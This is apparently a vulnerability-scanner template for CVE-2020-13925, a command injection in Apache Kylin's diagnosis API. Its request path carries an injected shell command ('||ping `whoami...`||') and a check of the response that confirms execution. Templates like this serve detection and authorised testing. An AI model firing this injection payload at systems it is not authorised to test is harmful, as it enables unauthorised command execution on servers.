id: CVE-2020-13925

info:
  name: Apache Kylin DiagnosisController.java RCE
  author: zan8in
  severity: critical
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13925
    - http://wiki.peiqi.tech/wiki/webserver/Apache/Apache%20Kylin%20DiagnosisController.java%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925.html

rules:
  r0:
    request:
      method: GET
      path: /kylin/api/diag/project/||ping `whoami.111.111.111`||/download
    expression: response.body.bcontains(b'"code":') && response.body.bcontains(b'"stacktrace":') && response.body.bcontains(b'kylin.111.111.111')
expression: r0()